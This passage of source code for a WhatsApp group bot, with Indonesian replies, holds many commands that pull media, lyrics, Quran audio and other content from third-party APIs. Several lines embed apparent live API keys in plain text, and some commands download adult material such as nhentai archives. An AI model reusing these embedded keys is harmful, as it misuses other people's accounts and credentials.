          reply("Loading.....");
          owgi = await dha.downloadAndSaveMediaMessage(ted);
          //	  console.log(owgi)
          anu = await imgbb("3395a377ebac7e9f744c3683b44a2a59", owgi);
          console.log(anu);
          hehe = await getBuffer(
            `https://fdz-app.herokuapp.com/api/maker/deltrash?imgurl=${anu.display_url}`
          );
          dha.sendMessage(from, hehe, image, {
            quoted: mek,
            thumbnail: Buffer.alloc(0),
          });
        }
        await limitAdd(sender)
break;

      case "squidrip":
      sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
        if (
          ((isMedia && !mek.message.videoMessage) || isQuotedImage) &&
          args.length == 0
        ) {
          ted = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          reply("Loading.....");
          owgi = await dha.downloadAndSaveMediaMessage(ted);
          console.log(owgi);
          anu = await imgbb("dc773cce66f3dcf3ab3bc83dc7bf3555", owgi);
          console.log(anu);
          hehe = await getBuffer(
            `https://fdz-app.herokuapp.com/api/maker/rip?picurl=${anu.display_url}`
          );
          dha.sendMessage(from, hehe, image, {
            quoted: mek,
            thumbnail: Buffer.alloc(0),
          });
        }
        await limitAdd(sender)
break;
case 'wasted':
case 'Wasted':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  sticWait(from)
	  owgi = await dha.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("520bd6f6209077d1777c2a4f20c509c2", owgi)
	  hehe = await getBuffer(`https://fdz-app.herokuapp.com/api/maker/wasted?imgurl=${anu.display_url}`)
	 dha.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Foto Nya Mana Gan ðŸ—¿')
	}
	await limitAdd(sender)
break
case 'lirik':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`lagunya?`)
                    query = args.join(" ")
x = await fetchJson(`https://viko-api.herokuapp.com/api/music/liriklagu?query=${query}&apikey=katashi`)
dha.sendMessage(from, `${x.result}`, text)
await limitAdd(sender)
break
case 'surahaudio':
case 'Surahaudio':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Surah Ke?`)
                    query = args.join(" ")	
x = await getBuffer(`https://zenzapi.xyz/api/quran/audio/${query}?apikey=Katashi`)
sticWait(from)
dha.sendMessage(from, x, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
await limitAdd(sender)
break
case 'ayataudio':
case 'Ayataudio':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
        if (args.length < 1) return reply(`Ayat Ke Brp?`)
					makell = args.join(" ")
					r1 = makell.split("|")[0];
					r2 = makell.split("|")[1];
u = await fetchJson(`https://zenzapi.xyz/api/quran/audio/${r1}/${r2}?apikey=Katashi`)
sticWait(from)
ookk = await getBuffer(u.result.audio)
dha.sendMessage(from, ookk, audio, {mimetype: 'audio/mp4', ptt:true, quoted: mek})
await limitAdd(sender)
break
case 'infogempa':
case 'Infogempa':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    ini_result = await fetchJson(`https://docs-jojo.herokuapp.com/api/infogempa`)
                    ini_buffer = await getBuffer(ini_result.map)
                    ini_txt = `Waktu : ${ini_result.waktu}\n`
                    ini_txt += `Magnitude : ${ini_result.magnitude}\n`
                    ini_txt += `Kedalaman : ${ini_result.kedalaman}\n`
                    ini_txt += `Kordinat : ${ini_result.koordinat}\n`
                    ini_txt += `Lokasi : ${ini_result.lokasi}\n`
                    ini_txt += `Potensi : ${ini_result.potensi}`
                    dha.sendMessage(from, ini_buffer, image, { caption: ini_txt })
                    await limitAdd(sender)
break
case 'qrmaker':
case 'qrmaker':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`textnya?`)
                    query = args.join(" ")	
loh = await getBuffer(`https://docs-jojo.herokuapp.com/api/qrcode?text=${query}`)
sticWait(from)
dha.sendMessage(from, loh, image)
await limitAdd(sender)
break
case 'jooxplay':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`https://zenzapi.xyz/api/downloader/joox?query=${query}&apikey=Katashi`)
                    yoo = get_result.result
                    ini_txt = `Title : ${yoo.lagu}\n`
                    ini_txt += `Album : ${yoo.album}\n`
                    ini_txt += `Artists : ${yoo.penyanyi}\n`
                    ini_txt += `Uploaded : ${yoo.publish}\n`
                    thumbnail = await getBuffer(yoo.img)
                    await dha.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    sticWait(from)
                    get_audio = await getBuffer(yoo.mp3Link)
                    await dha.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${yoo.lagu}.mp3`, quoted: mek })
                    get_video = await getBuffer(yoo.mp4aLink)
                    await dha.sendMessage(from, get_video, video)
                    await limitAdd(sender)
break
case 'faktaunik':
case 'fakta':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
x = await fetchJson(`https://docs-jojo.herokuapp.com/api/fakta-unik`)
dha.sendMessage(from, `${x.result}`, text)
reply(mess.success)
await limitAdd(sender)
break
case 'barmaker':
case 'barkodemaker':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`textnya?`)
                    query = args.join(" ")	
lih = await getBuffer(`https://api.zeks.me/api/barcode?apikey=Iyungputra&text=${query}`)
sticWait(from)
dha.sendMessage(from, lih, image)
await limitAdd(sender)
break
case 'artinama':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`lagunya?`)
                    query = args.join(" ")
x = await fetchJson(`https://api.zeks.me/api/artinama?apikey=Iyungputra&nama=${query}`)
dha.sendMessage(from, `${x.result}`, text)
reply(mess.success)
await limitAdd(sender)
break
case 'textrepeat':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
        if (args.length < 1) return reply(`teks|jumlah`)
					makell = args.join(" ")
					r1 = makell.split("|")[0];
					r2 = makell.split("|")[1];
x = await fetchJson(`https://yahaakatashiganz.herokuapp.com/api/repeat?text=${r1}&jumlah=${r2}&apikey=Katashi`)
dha.sendMessage(from, `${x.result}`, text)
reply(mess.success)
await limitAdd(sender)
break
case 'pinterest':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    if (args.length == 0) return reply(`Example: ${prefix + command} loli kawaii`)
                    query = args.join(" ")
                    ini_url = await fetchJson(`https://viko-api.herokuapp.com/api/pinterest?query=${query}&apikey=katashi`)
                    ini_url = ini_url.url_download
                    ini_buffer = await getBuffer(ini_url)
                    await dha.sendMessage(from, ini_buffer, image, { quoted: mek })
                    reply(mess.success)
                    await limitAdd(sender)
break
case 'translate2':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length < 1) return reply(`id|hello\nkode bisa di lihat di \n.kodebahasa`)
					makell = args.join(" ")
					r1 = makell.split("|")[0];
					r2 = makell.split("|")[1];
x = await fetchJson(`https://kocakz.herokuapp.com/api/edu/translate?lang=${r1}&text=${r2}`)
dha.sendMessage(from, `${x.text}`, text)
reply(mess.success)
await limitAdd(sender)
break
case 'quotes':
case 'randomquotes':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    quotes = await fetchJson(`https://kocakz.herokuapp.com/api/random/text/quotes`)
                    quotes = quotes.result
                    author = quotes.by
                    iyah = quotes.quote
                    reply(`_${iyah}_\n\n*â€• ${author}*`)
                    reply(mess.success)
                    await limitAdd(sender)
break
case 'waifu':
case 'radomwaifu':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
waipu = await getBuffer(`https://velgrynd.herokuapp.com/api/image/waifu`)
sticWait(from)
dha.sendMessage(from, waipu, image)
reply(mess.success)
await limitAdd(sender)
break
case 'cosplay2':
case 'randomcosplay2':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
waipu = await getBuffer(`https://velgrynd.herokuapp.com/api/image/cosplay`)
sticWait(from)
dha.sendMessage(from, waipu, image)
reply(mess.success)
await limitAdd(sender)
break
case 'doujindesuSearch': // Update By KATASHI
case 'doujinSearch': // Update By KATASHI
case 'doujin': // Update By KATASHI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (!isPremium) return reply(`Only Prem`)
        sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Teksnya?`)
                    query = args.join(" ")	
sticWait(from)
					data = await fetchJson(`https://velgrynd.herokuapp.com/api/doujindesuSearch?query=${query}`, {method: 'get'})
					teks = 'DOUJIN DESU SEARCH\n'
					for (let i of data.result) {
						teks += `*Nama:* : ${i.title}\n*Skor:* ${i.score}\n*Status:* ${i.status}\n*View:* ${i.link}\n*-:* ${i.thumb}\n\nDOUJIN DESU SEARCH\n`
					}
					reply(teks.trim())
					reply(mess.success)
					await limitAdd(sender)
break
case 'tts':
					  try{
        if (args.length > 1) {
        const gtts = require('./lib/gtts')(args[0])
        if (args.length < 2) return dha.sendMessage(from, 'Textnya mana gan?', text, {quoted: mek})
        ngab = budy.slice(7)
        ranm = getRandom('.mp3')
        rano = getRandom('.ogg')
        ngab.length > 600
        ? reply('Textnya kebanyakan gan')
        : gtts.save(ranm, ngab, function() {
            exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
                fs.unlinkSync(ranm)
                buff = fs.readFileSync(rano)
                if (err) return reply('Gagal gan:(')
                dha.sendMessage(from, buff, audio, {quoted:mek,ptt:true})
                fs.unlinkSync(rano)
            })
        })
	} else if ( args.length === 1 ){
		ngab = mek.message.extendedTextMessage.contextInfo.quotedMessage.conversation
		const gtts = require('./lib/gtts')(args[0])
        ranm = getRandom('.mp3')
        rano = getRandom('.ogg')
        gtts.save(ranm, ngab, function() {
            exec(`ffmpeg -i ${ranm} -ar 48000 -vn -c:a libopus ${rano}`, (err) => {
                fs.unlinkSync(ranm)
                buff = fs.readFileSync(rano)
                if (err) return reply(mess.error.api)
                dha.sendMessage(from, buff, audio, {quoted:mek,ptt:true})
                fs.unlinkSync(rano)
            })
        })
	}
} catch (e){
	reply(mess.error.api)
}
await limitAdd(sender)
break 
case 'caribioskop': // Update By KATASHI
case 'caribioskop': // Update By KATASHI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
if (args.length == 0) return reply(`kotanya?`)
                    query = args.join(" ")	
					data = await fetchJson(`https://docs-jojo.herokuapp.com/api/bioskop?kota=${query}`, {method: 'get'})
					teks = 'CARI BIOSKOP\n'
					for (let x of data.result) {
						teks += `*Nama:* : ${x.title}\n*Alamat* : ${x.alamat}\n*Bintang* : ${x.bintang}\n*Image* : ${x.img}\n*Link* : ${x.url}\n\n*CARI BIOSKOP*\n`
					}
					reply(teks.trim())
					reply(mess.success)
					await limitAdd(sender)
break
case 'linkwa': // Update By KATASHI
case 'linkwa': // Update By KATASHI
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
if (args.length == 0) return reply(`kotanya?`)
                    query = args.join(" ")	
					data = await fetchJson(`https://zenzapi.xyz/api/wagroup?query=${query}&apikey=Katashi`, {method: 'get'})
					teks = 'GROUP WA\n'
					for (let x of data.result) {
						teks += `*Perusahaan:* : ${x.nama}\n*Url* : ${x.link}\n\n*GROUP WA*\n`
					}
					reply(teks.trim())
					reply(mess.success)
					await limitAdd(sender)
break
					case 'cerpencinta':
case 'cerpencinta':	
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
					data = await fetchJson(`https://viko-api.herokuapp.com/api/cerpen/cinta?apikey=katashi`)
					reply(data.result)
					reply(mess.success)
					await limitAdd(sender)
break
					       case 'caristicker':
					case 'cs':
					case 'cstic':
					case 'searchsticker':
					case 'searchstiker':
					sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
					        sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Apanyang Mau Di Cari??`)
                    query = args.join(" ")	
              aud = await fetchJson(`https://api.zeks.me/api/searchsticker?apikey=Iyungputra&q=${query}`)
              sticWait(from)
              yahajaha = aud.sticker
               rjpp = yahajaha[Math.floor(Math.random() * yahajaha.length)];
sendWebp(from, rjpp)
reply(mess.success)
              await limitAdd(sender)
break
case "reminder": // by Slavyan
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
        if (!q)
          return reply(
            `CONTOH PENGGUNANNYA:\n${prefix}reminder text/2s\n\nNOTE: \n*s* - seconds\n*m* - minutes\n*h* - hours\n*d* - days`
          );
        teks = body.slice(10);
        const messRemind = teks.split("/")[0];
        const timeRemind = teks.split("/")[1];
        typeRemind = "Text";
        if (isQuotedImage) typeRemind = "Image";
        if (isQuotedSticker) typeRemind = "Sticker";
        if (isQuotedAudio) typeRemind = "Audio";
        if (!isQuotedImage && !isQuotedAudio && !isQuotedSticker)
          typeRemind = "Text";
        const parsedTime = ms(toMs(timeRemind));
        reminder.addReminder(
          sender,
          messRemind,
          typeRemind,
          timeRemind,
          _reminder
        );
        if (!isQuotedImage && !isQuotedSticker && !isQuotedAudio) {
          await dha.sendMessage(
            from,
            `â”€â”€ ã€Œ REMINDER ã€ â”€â”€
    
Reminder berhasil diaktifkan!
âž¸ Pesan: ${messRemind}
âž¸ Type: Text
âž¸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
âž¸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              dha.sendMessage(
                from,
                `â”€â”€ ã€Œ REMINDER ã€ â”€â”€

â° @${sender.split("@")[0]} â°
âž¸ Pesan: ${messRemind}
âž¸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedSticker) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await dha.downloadAndSaveMediaMessage(encmedia);
          await dha.sendMessage(
            from,
            `â”€â”€ ã€Œ REMINDER ã€ â”€â”€
    
Reminder berhasil diaktifkan!
âž¸ Pesan: ${messRemind}
âž¸ Type: Sticker
âž¸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
âž¸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              dha.sendMessage(
                from,
                `â”€â”€ ã€Œ REMINDER ã€ â”€â”€

â° @${sender.split("@")[0]} â°
âž¸ Pesan: ${messRemind}
âž¸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              dha.sendMessage(from, fs.readFileSync(media), sticker);
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedImage) {
          encmedia = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : mek;
          media = await dha.downloadAndSaveMediaMessage(encmedia);
          await dha.sendMessage(
            from,
            `â”€â”€ ã€Œ REMINDER ã€ â”€â”€
    
Reminder berhasil diaktifkan!
âž¸ Pesan: ${messRemind}
âž¸ Type: Image
âž¸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
âž¸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              teks = `â”€â”€ ã€Œ REMINDER ã€ â”€â”€

â° @${sender.split("@")[0]} â°
âž¸ Pesan: ${messRemind}
âž¸ Type: ${reminder.getReminderType(sender, _reminder)}`;
              dha.sendMessage(from, media, image, {
                contextInfo: { mentionedJid: [sender] },
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        } else if (isQuotedAudio) {
          encmedia = JSON.parse(JSON.stringify(mek).replace("quotedM", "m"))
            .message.extendedTextMessage.contextInfo;
          media = await dha.downloadAndSaveMediaMessage(encmedia);
          await dha.sendMessage(
            from,
            `â”€â”€ ã€Œ REMINDER ã€ â”€â”€
    
Reminder berhasil diaktifkan!
âž¸ Pesan: ${messRemind}
âž¸ Type: Audio
âž¸ Durasi: ${parsedTime.hours} jam ${parsedTime.minutes} menit ${
              parsedTime.seconds
            } detik
âž¸ Untuk: @${sender.split("@")[0]}
    `,
            text,
            { contextInfo: { mentionedJid: [sender] } }
          );
          const intervRemind = setInterval(async () => {
            if (Date.now() >= reminder.getReminderTime(sender, _reminder)) {
              anu = await reminder.getReminderMsg(sender, _reminder);
              dha.sendMessage(
                from,
                `â”€â”€ ã€Œ REMINDER ã€ â”€â”€

â° @${sender.split("@")[0]} â°
âž¸ Pesan: ${messRemind}
âž¸ Type: ${reminder.getReminderType(sender, _reminder)}`,
                text,
                { contextInfo: { mentionedJid: [sender] } }
              );
              dha.sendMessage(from, fs.readFileSync(media), audio, {
                contextInfo: { mentionedJid: [sender] },
                mimetype: "audio/mp4",
                ptt: true,
                caption: teks,
              });
              _reminder.splice(
                reminder.getReminderPosition(sender, _reminder),
                1
              );
              fs.writeFileSync(
                "./database/reminder.json",
                JSON.stringify(_reminder)
              );
              clearInterval(intervRemind);
            }
          }, 1000);
        }
        await limitAdd(sender)
break;
case 'addprem':  
if (!isOwner) return reply(`LU SIAPA AJG`)
					adprem = `${args[0].replace('@','')}@s.whatsapp.net`
					prem.push(adprem)
					fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
					reply(`BERHASIL MENAMBAHKAN USER PREMIUM`)
              await limitAdd(sender)
break				
		case 'dellprem':  
					
					if (!isOwner) return reply(mess.own)    
					delp = body.slice(10)
					prem.splice(`${delp}@s.whatsapp.net`, 1)
					fs.writeFileSync('./database/premium.json', JSON.stringify(prem))
					reply(`Berhasil Menghapus wa.me/${delp} Dari Daftar Premium`)
              await limitAdd(sender)
break
case 'listprem':
		case 'premlist'://By M4N1K
					teks = '*List Premium:*\n\n'
					for (let manikgans of prem) {
						teks += `- ${manikgans}\n`
					}
					teks += `\n*Total : ${prem.length}*`
					dha.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": prem } })
              await limitAdd(sender)
break
case 'splay':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://hadi-api.herokuapp.com/api/soundcloud/play?query=${query}`)
                    yoo = get_result.result
                    ini_txt = `Title : ${yoo.title}\n`
                    ini_txt += `Link : ${yoo.originalLink}\n`
                    ini_txt += `Information : ${get_result.msg}\n`
                    thumbnail = await getBuffer(yoo.thumbnail)
                    await dha.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
                    sticWait(from)
                    get_audio = await getBuffer(yoo.download)
                    await dha.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${yoo.lagu}.mp3`, quoted: mek })
                    await limitAdd(sender)
break
case 'dafontdownload':
case 'ddownload':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    if (args.length == 0) return reply(`Example: ${prefix + command} who ask satan`)
                    query = args.join(" ")
                    sticWait(from)
                    get_result = await fetchJson(`https://zenzapi.xyz/api/downloader/dafont?url=${query}&apikey=Katashi`)
                    yoo = get_result.result
                    ini_txt = `Title : ${yoo.judul}\n`
                    ini_txt += `Style : ${yoo.style}\n`
                    ini_txt += `Link : ${yoo.url}\n`
                    reply(ini_txt)
                    sticWait(from)
                    owwwh = yoo.url
                    yaa = await getBuffer(yoo.url)
                    dha.sendMessage(from, yaa, document, {quoted: mek, mimetype: 'zip', filename: `${yoo.judul}.zip` })
                    await limitAdd(sender)
break
case 'tebakumur':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    if (args.length == 0) return reply(`Example: ${prefix + command} kontol`)
                    ini_name = args.join(" ")
                    get_result = await fetchJson(`https://api.dha.xyz/api/tebakumur?apikey=PinnBotWibu&name=${ini_name}`)
                    get_result = get_result.result
                    ini_txt = `Nama : ${get_result.name}\n`
                    ini_txt += `Umur : ${get_result.age}`
                    reply(ini_txt)
                    await limitAdd(sender)
break
case 'asupan':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
                    get_result = await fetchJson(`https://api.dha.xyz/api/asupan?apikey=PinnBotWibu`)
                    ini_buffer = await getBuffer(get_result.result)
                    await dha.sendMessage(from, ini_buffer, video, { quoted: mek, mimetype: Mimetype.mp4, filename: "asupan.mp4" })
                    await limitAdd(sender)
break
case 'santuy':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
                    get_result = await getBuffer(`https://api.dapuhy.ga/api/asupan/asupansantuy?apikey=Pkjf7IBi2md7UAK`)
                    await dha.sendMessage(from, get_result, video, { quoted: mek, mimetype: Mimetype.mp4, filename: "asupan.mp4" })
                    await limitAdd(sender)
break

case 'ukhty':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
                    get_result = await getBuffer(`https://api.dapuhy.ga/api/asupan/asupanukhty?apikey=Pkjf7IBi2md7UAK`)
                    await dha.sendMessage(from, get_result, video, { quoted: mek, mimetype: Mimetype.mp4, filename: "asupan.mp4" })
                    await limitAdd(sender)
break
case 'vietnam':
case 'malaysia':
case 'korea':
case 'indonesia':
case 'japan':
case 'thailand':
case 'china':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
sticWait(from)
                    get_result = await fetchJson(`https://katashi-api.herokuapp.com/api/cewe/${command}?apikey=dhabot`)
                    ini_buffer = await getBuffer(get_result.result.url)
                    await dha.sendMessage(from, ini_buffer, image, { quoted: mek})
                    await limitAdd(sender)
break
case 'nhentaizip':
case 'nhentaizip':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
                    if (args.length == 0) return reply(`Example: ${prefix + command} kode nuklir`)
                    query = args.join(" ")
                    sticWait(from)
                    get_result = await fetchJson(`https://api-yogipw.herokuapp.com/api/nhentaidownloader?kode=${query}`)
                    yoo = get_result.result
                    ini_txt = `Title : ${yoo}\n`
                    reply(ini_txt)
                    sticWait(from)
                    owwwh = yoo
                    yaa = await getBuffer(yoo)
                    dha.sendMessage(from, yaa, document, {quoted: mek, mimetype: 'zip', filename: `${query}.zip` })
                    await limitAdd(sender)
break
                          case "demote":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        dha.groupDemoteAdmin(from, mentionUser)
        teks = `Succes Demote`;
        dha.sendMessage(from, teks, text, {
          quoted: mek,
        });
              await limitAdd(sender)
break;
      // Promote Members
      case "promote":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isGroup) return;
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
          dha.groupMakeAdmin(from, mentionUser)
        teks = `Succes Promote`;
        dha.sendMessage(from, teks, text, {
          quoted: mek,
        });
              await limitAdd(sender)
break;
        case 'ytmp43':
case 'ytmp43':
sticWait(from)
					        if (isBanned) return reply('Lu udh kena ban')
					        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
					        if (!isGroup) return reply(mess.only.group);
if (args.length == 0) return reply(`Example: ${prefix + command} https://youtu.be/vfpUAEUWAlg`)
                    query = args.join(" ")
                    get_result = await fetchJson(`http://hadi-api.herokuapp.com/api/yt2/video?url=${query}`)
                    yoo = get_result.result
                    sticWait(from)
                    ini_txt = `Title : ${yoo.title}\n`
                    ini_txt += `Link : ${yoo.download_video}\n`
                    ini_txt += `Size : ${yoo.size}\n`
                    ini_txt += `Resolution : ${yoo.resolution}\n`
                    sticWait(from)
                    horny1 = await getBuffer(yoo.thumb)
                    await dha.sendMessage(from, horny1, image, {quoted: mek, caption: ini_txt})
                    sticWait(from)
                    horny2 = await getBuffer(yoo.download_video)
